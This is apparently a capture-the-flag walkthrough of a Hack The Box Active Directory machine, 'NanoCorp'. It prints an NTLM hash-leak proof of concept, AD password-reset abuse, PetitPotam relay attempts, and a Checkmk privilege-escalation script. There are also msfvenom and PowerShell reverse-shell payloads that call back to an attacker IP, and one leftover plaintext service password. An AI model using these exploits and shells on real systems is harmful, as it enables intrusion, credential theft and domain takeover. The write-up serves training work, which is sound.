- - - 
created : 27-11-2025 

Tags : #hard 

Released on 08 Nov 2025 (Season 9)
- - - 
# CHANGELOG

19TH NOVEMBER, 2025

Patched CVE-2025-54918 & CVE-2025-33073
# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/NanoCorp/user]
└─$ rustscan -a nanocorp.htb -- -A  
Open 10.10.11.93:53
Open 10.10.11.93:80
Open 10.10.11.93:88
Open 10.10.11.93:593
Open 10.10.11.93:636
Open 10.10.11.93:3269
Open 10.10.11.93:3268
Open 10.10.11.93:5986
Open 10.10.11.93:9389
Open 10.10.11.93:49664
Open 10.10.11.93:49668
Open 10.10.11.93:50603
Open 10.10.11.93:50615
Open 10.10.11.93:50620
Open 10.10.11.93:50637

PORT      STATE SERVICE           REASON          VERSION
53/tcp    open  domain            syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http              syn-ack ttl 127 Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
| http-methods: 
|_  Supported Methods: HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://nanocorp.htb/
88/tcp    open  kerberos-sec      syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-11-27 20:48:41Z)
593/tcp   open  ncacn_http        syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?          syn-ack ttl 127
3268/tcp  open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl? syn-ack ttl 127
5986/tcp  open  ssl/http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.nanocorp.htb
| Subject Alternative Name: DNS:dc01.nanocorp.htb

9389/tcp  open  mc-nmf            syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
50603/tcp open  ncacn_http        syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
50615/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
50620/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
50637/tcp open  msrpc             syn-ack ttl 127 Microsoft Window

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   185.11 ms 10.10.14.1
2   185.40 ms dc01.nanocorp.htb (10.10.11.93)
```

This is a [Active Directory](../../../3%20-%20Tags/Hacking%20Concepts/Active%20Directory.md) environment, you can check [Intro to Active Directory Theory](../Academy/Intro%20to%20Active%20Directory%20Theory.md)  and better understand all processes.

Let's add `dc01.nanocorp.htb` to `/etc/hosts`.
# Enumeration
## HTTP (80)
### Gobuster

We can use [Gobuster](../../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) to start [Enumeration](../../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on the target :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/NanoCorp/user]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u  http://nanocorp.htb
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 301]
/.htpasswd            (Status: 403) [Size: 301]
/aux                  (Status: 403) [Size: 301]
/cgi-bin/             (Status: 403) [Size: 301]
/com1                 (Status: 403) [Size: 301]
/com2                 (Status: 403) [Size: 301]
/com3                 (Status: 403) [Size: 301]
/com4                 (Status: 403) [Size: 301]
/con                  (Status: 403) [Size: 301]
/css                  (Status: 301) [Size: 334] [--> http://nanocorp.htb/css/]
/examples             (Status: 503) [Size: 401]
/img                  (Status: 301) [Size: 334] [--> http://nanocorp.htb/img/]
/js                   (Status: 301) [Size: 333] [--> http://nanocorp.htb/js/]
/licenses             (Status: 403) [Size: 420]
/lpt1                 (Status: 403) [Size: 301]
/lpt2                 (Status: 403) [Size: 301]
/nul                  (Status: 403) [Size: 301]
/phpmyadmin           (Status: 403) [Size: 301]
/prn                  (Status: 403) [Size: 301]
/server-status        (Status: 403) [Size: 420]
/server-info          (Status: 403) [Size: 420]
/webalizer            (Status: 403) [Size: 301]
Progress: 20478 / 20478 (100.00%)
===============================================================
Finished
===============================================================
```

Visit the page:

![Pasted image 20251127140433.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251127140433.png)

Add `hire.nanocorp.htb` to `/etc/hosts`:

![Pasted image 20251127140544.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251127140544.png)
## Kerberos (88)
### Kerbrute

We can use `kerbrute` with some wordlists to start users enumeration on the domain:

```bash
└─$ /home/mdn0x/Documenti/GitTools/AD/kerbrute userenum --dc 10.10.11.93 -d nanocorp.htb /usr/share/wordlists/john.smith.txt

[+] VALID USERNAME:       Administrator@nanocorp.htb

```

```go
 /home/mdn0x/Documenti/GitTools/AD/kerbrute userenum --dc 10.10.11.93 -d nanocorp.htb /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt 
```
# Exploit
## CVE-2025-24071/24054

**The CVE number previously defined by Microsoft, CVE-2025-24071, has been updated to CVE-2025-24054**

We'll use: https://github.com/0x6rss/CVE-2025-24071_PoC?tab=readme-ov-file

NTLM Hash Leak via RAR/ZIP Extraction and .library-ms File


```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/NanoCorp/user]
└─$ git clone https://github.com/0x6rss/CVE-2025-24071_PoC.git
Clone in 'CVE-2025-24071_PoC' in corso...
remote: Enumerating objects: 18, done.
remote: Counting objects: 100% (18/18), done.
remote: Compressing objects: 100% (16/16), done.
remote: Total 18 (delta 4), reused 0 (delta 0), pack-reused 0 (from 0)

─$ cd CVE-2025-24071_PoC 

─$ ls
poc.py  README.md

─$ cat poc.py 
import os
import zipfile

def main():
    file_name = input("Enter your file name: ")
    ip_address = input("Enter IP (EX: 192.168.1.162): ")


    library_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\\\{ip_address}\\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
"""

    library_file_name = f"{file_name}.library-ms"
    with open(library_file_name, "w", encoding="utf-8") as f:
        f.write(library_content)


    with zipfile.ZipFile("exploit.zip", mode="w", compression=zipfile.ZIP_DEFLATED) as zipf:
        zipf.write(library_file_name)


    if os.path.exists(library_file_name):
        os.remove(library_file_name)

    print("completed")

if __name__ == "__main__":
    main()
```

Usage:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/NanoCorp/user/CVE-2025-24071_PoC]
└─$ chmod +x poc.py

$ python3 poc.py                                                    
Enter your file name: myCV    
Enter IP (EX: 192.168.1.162): 10.10.14.75  # Attacker IP
completed

─$ mv exploit.zip myCV.zip  
```

Now start [Responder](../Starting%20Point/Tier%201/Responder.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/NanoCorp/user/CVE-2025-24071_PoC]
└─$ sudo responder -I tun0   
[sudo] password di mdn0x: 

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...  
```

Upload the file:

![Pasted image 20251127142708.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251127142708.png)
![Pasted image 20251127142751.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251127142751.png)
Check listener:

```python
[SMB] NTLMv2-SSP Client   : 10.10.11.93
[SMB] NTLMv2-SSP Username : NANOCORP\web_svc
[SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:HTB{REDACTED_HASH} 
```

Crack the hash for `web_svc`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/NanoCorp/user/CVE-2025-24071_PoC]
└─$ john web_hash -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
HTB{REDACTED_PASSWD}   (web_svc)     
1g 0:00:00:00 DONE (2025-11-27 14:28) 2.631g/s 4882Kp/s 4882Kc/s 4882KC/s doom93..djcward
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Request a TGT:

```bash
─$ sudo timedatectl set-ntp off
─$ sudo rdate -n 10.10.11.93
─$ impacket-getTGT nanocorp.htb/'web_svc':'HTB{REDACTED_PASSWD}' -dc-ip 10.10.11.93
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in web_svc.ccache
```
# Lateral Movement
## web_svc to monitoring_svc

Collect for [Bloodhound](../../../3%20-%20Tags/Hacking%20Tools/Bloodhound.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/NanoCorp/user]
└─$ bloodhound-python -u 'web_svc' -p 'HTB{REDACTED_PASSWD}' -d nanocorp.htb -ns 10.10.11.93 -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: nanocorp.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.nanocorp.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.nanocorp.htb
INFO: Found 6 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.nanocorp.htb
INFO: Done in 00M 21S
INFO: Compressing output into 20251127213557_bloodhound.zip
```

Collect with `rusthound-ce`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/NanoCorp/user]
└─$ export KRB5CCNAME=/home/mdn0x/HTB/Machines/NanoCorp/user/web_svc.ccache 

─$ rusthound-ce -d NANOCORP.HTB -u web_svc -k -z -f DC01.NANOCORP.HTB

INFO  rusthound_ce::json::maker::common] 6 users parsed!
INFO  rusthound_ce::json::maker::common] 61 groups parsed!
INFO  rusthound_ce::json::maker::common] 1 computers parsed!
INFO  rusthound_ce::json::maker::common] 2 ous parsed!
INFO  rusthound_ce::json::maker::common] 3 domains parsed!
INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
INFO  rusthound_ce::json::maker::common] 73 containers parsed!
```

Upload and use the GUI:

![Pasted image 20251127214641.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251127214641.png)

![Pasted image 20251127214625.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251127214625.png)

`web_svc` has `AddSelf` on `IT_Support` group, who has `ForceChangePassword` on `monitoring_svc` who is part of `Remote Management Users` therefore we can use [Evil-WinRM](../../../3%20-%20Tags/Hacking%20Tools/Evil-WinRM.md) if we obtain the account.

We can use `bloodyAD` tool to add `web_svc` to `IT_Support`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/NanoCorp/user]
└─$ bloodyAD --host dc01.nanocorp.htb -d 'nanocorp.htb' -u web_svc -k add groupMember IT_Support web_svc
[+] web_svc added to IT_Support
```

Then change password, use the credentials:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/NanoCorp/user]
└─$ bloodyAD --host dc01.nanocorp.htb -d nanocorp.htb -u web_svc -p 'HTB{REDACTED_PASSWD}' set password monitoring_svc 'Start1234' 
[+] Password changed successfully!
```

Request a ticket for `monitoring_svc`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/NanoCorp/user]
└─$ impacket-getTGT nanocorp.htb/'monitoring_svc':'Start1234' -dc-ip 10.10.11.93
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in monitoring_svc.ccache

─$ export KRB5CCNAME=/home/mdn0x/HTB/Machines/NanoCorp/user/monitoring_svc.ccache 
```
### Evil_winrmexec.py

Use the ticket for `monitoring_svc` and access with `evil_winrmexec.py` or `impacket` script:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/NanoCorp/user/winrmexec]
└─$ python3 winrmexec.py -k -no-pass dc01.nanocorp.htb -p 5986 -url https://dc01.nanocorp.htb:5986/wsman
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] using domain and username from ccache: NANOCORP.HTB\monitoring_svc
[*] '-spn' not specified, using HTTP/dc01.nanocorp.htb@NANOCORP.HTB
[*] '-dc-ip' not specified, using NANOCORP.HTB
PS C:\Users\monitoring_svc\Documents> ls
PS C:\Users\monitoring_svc\Documents> cd ../Desktop
PS C:\Users\monitoring_svc\Desktop> ls


    Directory: C:\Users\monitoring_svc\Desktop


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-a----        11/27/2025   2:15 PM            572 a.ps1                                                                 
-a----        11/27/2025   2:09 PM          52736 RunasCs.exe                                                           
-a----        11/27/2025   2:14 PM         245982 test.exe                                                              
-ar---        11/27/2025   1:22 PM             34 user.txt                                                              


PS C:\Users\monitoring_svc\Desktop> cat user.txt
   HTB{REDACTED_FLAG}

PS C:\Users\monitoring_svc\Desktop> cat /test/preuve.txt
EXECUTE PAR : monitoring_svc
DATE COMPILATION : Fri Nov 28 00:12:37 2025

=== CONTENU DE C:\Users\Administrator\Desktop\root.txt ===
[ERREUR] Fichier non trouve ou acces refuse.
```
# Privilege Escalation

## Unintended Path - Relay CVE-2025-33073

We can use `ntlmrelayx` , use `web_svc`  for **NTLM reflection**

https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025

**Petitpotam Attack**

First we register the `dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` DNS record and made it point to our IP address. This format can be used to coerce machines into authenticating via Kerberos to a controlled IP address (ours):

```bash
─$ cp -r /home/mdn0x/HTB/Machines/Signed/root/krbrelayx .        
─$ cd krbrelayx                                          
─$ ls               
addspn.py  dnstool.py  krbrelayx.py  lib  LICENSE  printerbug.py  README.md

┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/NanoCorp/root/krbrelayx]
└─$ python3 dnstool.py -u 'nanocorp.htb\WEB_SVC' -p 'HTB{REDACTED_PASSWD}' nanocorp.htb -dc-ip 10.10.11.93 -dc-ip 10.10.11.93 -a add -r dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d 10.10.14.75
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
```

This is not working anymore because of patches: Microsoft’s PetitPotam/DFS coercion patches, restrict which accounts can modify DNS records.

Then we use  `ntlmrelayx.py`:

```bash
ntlmrelayx.py -t winrms://10.10.11.93 -smb2support
```

PetitPotam coerces a `SYSTEM` service (lsass.exe) into authenticating to a controlled machine, therefore a machine account authentication is received. As the authentication originates from the same machine, the relay fails.

`petitpotam` and `ntlm relay` go hand in hand here because there's no other way of coercion in this case (except printer bug or petitpotam):

```bash
python3 PetitPotam.py -u web_svc -p 'HTB{REDACTED_PASSWD}' -d nanocorp.htb srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA DC01.NANOCORP.HTB

Trying pipe lsarpc
[-] Connecting to ncacn_np:DC01.NANOCORP.HTB[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

Still displays the vulnerability, but we don't have access to DNS records.

This is not working anymore because of patches: Microsoft’s PetitPotam/DFS coercion patches, restrict which accounts can modify DNS records.
## Intended Path -  Checkmk Agent  -  CVE-2024-0670

Check processes:

```powershell
PS C:\> ps

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                   
-------  ------    -----      -----     ------     --  -- -----------                                                   
    114       7     1340       6504       0.11   3232   0 AggregatorHost                                                
    203      13     3144      12524       0.00   7828   2 AzureArcSysTray                                               
    234      15     3008      12760       0.14   6348   0 check_mk_agent                                                
     87       6     2600       4684       0.00   1516   0 cmd                                                           
    107       8     2940       5704       0.02   4256   0 cmd                                                           
    103      11     1484       7368       0.02   1256   0 cmk-agent-ctl  
    <SNIP>
```

Check the process of `check_mk` agent, run the following command to get the PID and the path of the `check_mk_agent` process::

```powershell
PS C:\> Get-Process | Where-Object {$_.Name -match "check_mk"} | For
mat-List ProcessName,Id,Path,StartTime,Responding


ProcessName : check_mk_agent
Id          : 6348
Path        : C:\Program Files (x86)\checkmk\service\check_mk_agent.exe
StartTime   : 
Responding  : True
```

To find the user associated with the process, you can use the `Get-WmiObject` cmdlet with the `Win32_Process` class. Run the following:

```powershell
PS C:\> $process = Get-WmiObject -Class Win32_Process -Filter "Name = 'che
ck_mk_agent.exe'"
$process.GetOwner()
 


__GENUS          : 2
__CLASS          : __PARAMETERS
__SUPERCLASS     : 
__DYNASTY        : __PARAMETERS
__RELPATH        : 
__PROPERTY_COUNT : 3
__DERIVATION     : {}
__SERVER         : 
__NAMESPACE      : 
__PATH           : 
Domain           : NT AUTHORITY
ReturnValue      : 0
User             : SYSTEM
PSComputerName   : 
```

**NT AUTHORITY\SYSTEM** = Bingo !!

Once you have the path to `check_mk_agent.exe`, you can check its version by running:

```powershell
PS C:\Users\Administrator\Documents> (Get-Item "C:\Program Files (x86)\checkmk\service\check_mk_agent.e
xe").VersionInfo

ProductVersion   FileVersion      FileName                                                                              
--------------   -----------      --------                                                                              
2.1.0p10         2.1.0.0          C:\Program Files (x86)\checkmk\service\check_mk_agent.exe  
```

Search for it: https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent

**The Checkmk agent allows a local privilege escalation on a Windows system. The agent creates and executes temporary files that can be manipulated by an attacker.**

In the first step, the filename that will be used by _Checkmk_ needs to be found. The application creates temporary files with name cmk_{}_{}_{}.cmd. The placeholders are replaced with a string, the process id and a counter. The first string was always 'all' and the counter usually is 0. The process id is not exactly predictable. However, Windows assigns those numbers in increasing order. This allows to observe the currently used process ids and define a limited range of probable ids.

First, we have to use `msfvenom` to create a binary that gives us a root shell or copy the flag file:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/NanoCorp/root]
└─$ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.75 LPORT=1337 -f exe -o rev.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 230982 bytes
Final size of exe file: 238080 bytes
Saved as: rev.exe
```

Start a [Metasploit-Framework (MSF)](../../../3%20-%20Tags/Hacking%20Tools/Metasploit-Framework%20(MSF).md) listener for the `meterpreter` shell:

```bash
└─$ msfconsole                                                                                        

msf > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp

msf exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp 
payload => windows/x64/meterpreter_reverse_tcp

msf exploit(multi/handler) > set lhost tun0
lhost => tun0
msf exploit(multi/handler) > set lport 1337
lport => 1337

msf exploit(multi/handler) > set exitfunc none
exitfunc => none

msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.75:1337 
```

You can't repair as `monitoring_svc` (PID doesn't change) so use `RunasCs` as  `web_svc`:

```powershell
└─$ git clone https://github.com/antonioCoco/RunasCs.git      
Clone in 'RunasCs' in corso...
remote: Enumerating objects: 371, done.
remote: Counting objects: 100% (108/108), done.
remote: Compressing objects: 100% (62/62), done.
remote: Total 371 (delta 72), reused 46 (delta 46), pack-reused 263 (from 3)

─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
"GET /RunasCs.cs HTTP/1.1" 200 -

PS C:\Users\monitoring_svc\Desktop> wget http://10.10.14.75/RunasCs.cs -o RunasCs.cs

# Compile

PS C:\Users\monitoring_svc\Desktop> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:exe -optimize -out:RunasCs.exe RunasCs.cs
Microsoft (R) Visual C# Compiler version 4.8.4161.0

for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.



This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240



PS C:\Users\monitoring_svc\Desktop> ./RunasCs.exe web_svc dksehdgh712!@#  powershell.exe -r 10.10.14.75:4444

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-1d6b97d$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 6924 created in background.
```

```bash
─$ nc -lvnp 4444

listening on [any] 4444 ...
connect to [10.10.14.75] from dc01.nanocorp.htb [10.10.11.93] 64472
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
nanocorp\web_svc
```

Transfer the `rev.exe` file and `script.ps1` on `web_svc` session:

```bash
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```powershell
PS C:\Users\web_svc\Desktop> wget http://10.10.14.75/rev.exe -o rev.exe

PS C:\Users\web_svc\Desktop> wget http://10.10.14.75/script.ps1 -o script.ps1
```

**In the second step**, the attacker places the malicious binary into the folder C:\Windows\Temp multiple times. The filenames are constructed using the above pattern for all different probable ids. After placing the files, the attacker marks them as read-only. Both can be automated using a powershell script or command.

**The final step** is to force *Checkmk* to write and execute those temporary files.

We investigate the folder C:\Windows\Installer to find the correct name on this system:

```bash
Directory: C:\Windows\Installer


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
d-----          4/2/2025   6:25 PM                {6070BE95-B84D-40FE-8ABD-C70B59F5A164}                                
d-----          4/5/2025   4:17 PM                {675A6D5C-FF5A-11EF-AEA3-1967AD678D6D}                                
-a----         3/28/2025   3:08 PM       12637696 1e6f2.msi                                                             
-a----         5/10/2023   9:16 AM         184320 387c2.msi                                                             
-a----         5/10/2023   9:21 AM         184320 387c6.msi                                                             
-a----         5/10/2023   9:35 AM         192512 387ca.msi                                                             
-a----         5/10/2023   9:39 AM         192512 387ce.msi                                                             
-a----          4/2/2025   6:24 PM       60895232 387d1.msi                                                             
-a----          4/2/2025   6:24 PM          20480 SourceHash{0025DD72-A959-45B5-A0A3-7EFEB15A8050}                      
-a----          4/2/2025   6:25 PM          20480 SourceHash{6070BE95-B84D-40FE-8ABD-C70B59F5A164}                      
-a----          4/5/2025   4:17 PM          20480 SourceHash{675A6D5C-FF5A-11EF-AEA3-1967AD678D6D}                      
-a----          4/2/2025   6:24 PM          20480 SourceHash{73F77E4E-5A17-46E5-A5FC-8A061047725F}                      
-a----          4/2/2025   6:24 PM          20480 SourceHash{C2C59CAB-8766-4ABD-A8EF-1151A36C41E5}                      
-a----          4/2/2025   6:24 PM          20480 SourceHash{D5D19E2F-7189-42FE-8103-92CD1FA457C2} 

PS C:\Windows\Temp> Get-ChildItem C:\Windows\Installer\*.msi | ForEach-Object { $i = New-Object -ComObject WindowsInstaller.Installer; $db = $i.OpenDatabase($_.FullName, 0); $v = $db.OpenView("SELECT Value FROM Property WHERE Property='ProductName'"); $v.Execute(); $r = $v.Fetch(); if($r) { Write-Host "$($_.Name) - $($r.StringData(1))" }; $v.Close() }
Get-ChildItem C:\Windows\Installer\*.msi | ForEach-Object { $i = New-Object -ComObject WindowsInstaller.Installer; $db = $i.OpenDatabase($_.FullName, 0); $v = $db.OpenView("SELECT Value FROM Property WHERE Property='ProductName'"); $v.Execute(); $r = $v.Fetch(); if($r) { Write-Host "$($_.Name) - $($r.StringData(1))" }; $v.Close() }
1e6f2.msi - Check MK Agent 2.1
387c2.msi - Microsoft Visual C++ 2022 X86 Minimum Runtime - 14.36.32532
387c6.msi - Microsoft Visual C++ 2022 X86 Additional Runtime - 14.36.32532
387ca.msi - Microsoft Visual C++ 2022 X64 Minimum Runtime - 14.36.32532
387ce.msi - Microsoft Visual C++ 2022 X64 Additional Runtime - 14.36.32532
387d1.msi - VMware Tools
```

`1e6f2.msi` is the one we need.
Repairing the software is enough. This repair process can be initiated using the following command on `web_svc` session:

```powershell
PS C:\Users\web_svc> msiexec /fa C:\Windows\Installer\1e6f2.msi /qn      
```

This `script.ps1`will combine **step2** and **step3**:

```powershell
param(
    [int]$MinPID = 1000,
    [int]$MaxPID = 15000
)

# Path to the payload (generic executable)
$PayloadPath = "C:\Users\web_svc\Desktop\rev.exe"

# Check if the payload file exists
if (-not (Test-Path $PayloadPath)) {
    Write-Error "The payload file does not exist: $PayloadPath"
    return
}

# 1. Hardcoded MSI path
$msi = "C:\Windows\Installer\1e6f2.msi"

if (-not (Test-Path $msi)) {
    Write-Error "MSI not found at path: $msi"
    return
}

Write-Host "[*] MSI found: $msi"


# 2. Write file to target locations
Write-Host "[*] Writing files from $MinPID to $MaxPID..."

foreach ($ctr in 0..1) {

    for ($pid = $MinPID; $pid -le $MaxPID; $pid++) {

        $filePath = "C:\Windows\Temp\cmk_all_${pid}_${ctr}.cmd"

        try {
            # Securely copy the payload as binary
            [System.IO.File]::Copy($PayloadPath, $filePath, $true)

            # Set Read-Only attribute
            Set-ItemProperty -Path $filePath -Name IsReadOnly -Value $true -ErrorAction SilentlyContinue
        }
        catch {
            Write-Warning "Error writing $filePath : $_"
        }
    }
}

Write-Host "[*] Files written."

# 3. Execute MSI repair
Write-Host "[*] Starting MSI repair..."

Start-Process "msiexec.exe" `
    -ArgumentList "/fa `"$msi`" /qn" `
    -Wait

Write-Host "[*] Process completed."
```

Run the script:

```powershell
PS C:\Users\web_svc\Desktop> ./script.ps1
./script.ps1
[*] MSI found: C:\Windows\Installer\1e6f2.msi
[*] Writing files from 1000 to 15000...
Cannot overwrite variable PID because it is read-only or constant.
At C:\Users\web_svc\Desktop\script.ps1:31 char:10
+     for ($pid = $MinPID; $pid -le $MaxPID; $pid++) {
+          ~~~~~~~~~~~~~~
    + CategoryInfo          : WriteError: (PID:String) [], SessionStateUnauthorizedAccessException
    + FullyQualifiedErrorId : VariableNotWritable
 
Cannot overwrite variable PID because it is read-only or constant.
At C:\Users\web_svc\Desktop\script.ps1:31 char:10
+     for ($pid = $MinPID; $pid -le $MaxPID; $pid++) {
+          ~~~~~~~~~~~~~~
    + CategoryInfo          : WriteError: (PID:String) [], SessionStateUnauthorizedAccessException
    + FullyQualifiedErrorId : VariableNotWritable
 
[*] Files written.
[*] Starting MSI repair...
[*] Process completed.
```

Check listener on `msfconsole`:

```bash
[*] Meterpreter session 1 opened (10.10.14.75:1337 -> 10.10.11.93:64546)
```

Catching this race condition is not easy, re-try multiple times or,

if the script is not working, this is a `powershell` one-liner, open a [Netcat](../../../3%20-%20Tags/Hacking%20Tools/Netcat.md) listener and run:

```powershell
$ip="10.10.xx.xx";$ps='$c=New-Object System.Net.Sockets.TCPClient("'+$ip+'",1337);$s=$c.GetStream();[byte[]]$b=0..65546|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+"PS "+(pwd).Path+"> ";$sb3=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb3,0,$sb3.Length);$s.Flush()};$c.Close()';$bytes=[Text.Encoding]::Unicode.GetBytes($ps);$enc=[Convert]::ToBase64String($bytes);$cmd="@echo off`npowershell -NoP -NonI -Exec Bypass -EncodedCommand $enc";Remove-Item C:\Windows\Temp\cmk_all_*.cmd -Force -EA SilentlyContinue;1000..15000|%{$cmd|Out-File "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Encoding ASCII -Force;Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true};msiexec /fa "C:\Windows\Installer\1e6f2.msi"
```

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/NanoCorp/user/winrmexec]
└─$ nc -lvp 1337

listening on [any] 1337 ...
connect to [10.10.14.75] from dc01.nanocorp.htb [10.10.11.93] 52195
whoami
nt authority\system
PS C:\Windows\system32> type /Users/Administrator/root.txt
PS C:\Windows\system32> cd /Users
PS C:\Users> cd Administrator
PS C:\Users\Administrator> cd Desktop
PS C:\Users\Administrator\Desktop> type root.txt
  HTB{{REDACTED_FLAG}}
```

Root flag obtained !
## Secrets Dump 

We can find the `SYSTEM` and `NTDS` files, safe copy then zip and grab them:

```bash
PS C:\Users\Administrator\Desktop> Get-Item -Path "C:\Windows\System32\Config\SYSTEM","C:\Windows\NTDS\ntds.dit" -ErrorAction SilentlyContinue



    Directory: C:\Windows\System32\Config


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
